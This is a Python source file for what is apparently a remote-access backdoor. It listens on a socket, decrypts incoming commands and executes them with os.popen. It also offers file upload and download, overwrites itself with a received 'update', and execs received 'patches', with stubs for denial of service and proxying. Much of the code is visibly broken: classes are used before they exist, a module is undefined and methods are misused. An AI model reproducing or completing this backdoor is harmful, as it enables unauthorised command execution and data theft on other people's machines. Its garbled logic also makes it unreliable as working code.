import socket
import os
import subprocess
import threading
import queue
import marshal
import random
import crypt
import hashlib
import rsa
from Crypto.Cipher import AES
import base64
import sys
import encoder

debug = True # debug options. I wasted my %s minutes on this shit. You won't edit it.

# Behold! No more comments and good luck =]



# PSK
key = 'YOUR_PSK_HERE'
host = '233.233.233.233'
port = ''
aes_psk = '' # 16/24/32 bytes long string
aes_size = ''
rsa_key = '' # RSA Prikey
rsa_len = ''
rsa_pub = '' #RSA Pubkey
custom_num = '1' # CHAR Cipher

if debug == True:
    key = 'PSK'
    host = 'localhost'
    port = 4444

class handler(): # Main handler

    def __init__(self):
        pass

    def getInput(self, sess):
        sess.accept()
        resp = sess.recv(512)
        if (resp):
            return resp

    def sendOutput(self, sess, output):
        try:
            sess.send(str(output))
            return 0
        except:
            return 1
    pass


class connector(): # Connector
    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    conn.bind((host,port))
    pass

class mainHandler():
    conn = connector()
    cmdHandler = cmdHandler()
    FuncHandler = FuncHandler()
    io = handler()
    session = conn.conn
    session.listen(1)
    while True:
        cmd = io.getInput(session)
        plaintext = encoder.decrypt(cmd,'NORMAL')
        if plaintext != None:
            cmdHandler.getType(str(plaintext))
    pass

class cmdHandler():
    def getType(self,raw):
        type = raw[-1]
        cmd = raw[0:-2]
        if type == '0':
            res = self.exeCmd(cmd)
        if type == '1':
            pass



    def exeCmd(self,cmd):
        pipe = os.popen(str(cmd))
        res = pipe.read()
        return  res


class FuncHandler():
    # FILE FORMAT
    # 0-40 Filename&&Filepath 40: b64decode(FileContent)
    def uploadFile(self,file):
        try:
            fname = file[0:39]
            file = file[40:]
            f = open(str(fname),'rw+')
            f.write(base64.b64decode(file))
            f.close()
        except:
            pass
        return 0

    def downloadFile(self,file):
        # FILE FORMAT
        # 0-40 Filename&&Filepath 40: b64encode(FileContent)
        try:
            f = open(file)
            filename = file.ljust('\x20',40)
            raw = f.read()
            buf = filename + base64.b64encode(raw)
        except:
            pass
        return 0
    def dos(self,type,addr):
        pass
    def update(self,packet):
        packet = base64.b64decode(packet)
        filepath = os.path.basename(__file__)
        f = open(str(filepath),'w+')
        f.write(packet)
        f.close()
        return 0
    def getPatch(self,patch):
        file = marshal.dumps(patch)
        exec(file)
    def proxy(self,port,addr):
        pass
    def cmdForward(self,packet):
        pass

    pass

# Load session
# Start handler
# Exec cmd